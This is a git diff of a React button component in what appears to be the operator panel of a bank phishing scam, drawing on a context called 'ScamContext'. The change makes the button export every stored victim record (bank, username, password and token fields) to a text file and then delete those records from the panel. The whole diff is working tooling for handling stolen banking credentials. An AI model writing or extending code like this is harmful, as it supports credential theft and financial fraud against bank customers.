@@ -2,15 +2,17 @@ import { saveAs } from 'file-saver';
 import React, { useContext } from 'react'
 import { ScamContext } from '../../context/ScamContext';
 
-export const BtnDownloadTxt = ({active}) => {
+export const BtnDownloadTxtAndDelete = () => {
 
-    const {users, selected, filteredType} = useContext(ScamContext);
+    const {users, deleteAllUser, filteredType, selected} = useContext(ScamContext);
     
-    const downloadUsers = () => {
+// ${e.celular != undefined && (filteredType.includes('Celular') || filteredType.length == 1) ? `= celular: ${e.celular} \n` : ''}
+    
+    const downloadAndDeleteUsers = async() => {
         if(users.length == 0) return
         
-        const blob = new Blob(users.map(e => {
-            return `==========
+            const blob = new Blob(users.map(e => {
+                return `==========
 = banco: ${e.name}
 = usuario: ${e.username}
 = clave: ${e.password}
@@ -19,19 +21,21 @@ ${e.token1 != undefined && (filteredType.includes('Token1') || filteredType.leng
 
 `
 }), { type: 'type/plain;charset=utf-8' });
+            
+            saveAs(blob, `${selected}-${filteredType}-${users.length}.txt`)
+    
+            return await deleteAllUser(users[0].name)
         
-        saveAs(blob, `${selected}-${filteredType}-${users.length}.txt`)
-
     }
 
     return (
         <div className='flex flex-col'>
             <button 
-                onClick={() => downloadUsers()}
-        
-        className={ 'px-3 text-left rounded py-1 hover:bg-blue-400 hover:text-white' }
-            >Exportar txt</button>
+                onClick={() => downloadAndDeleteUsers()}
+                className={'px-3 text-left rounded py-1 hover:bg-blue-400 hover:text-white'}
+            >
+                Exportar y eliminar
+            </button>
         </div>
     )
 }
-
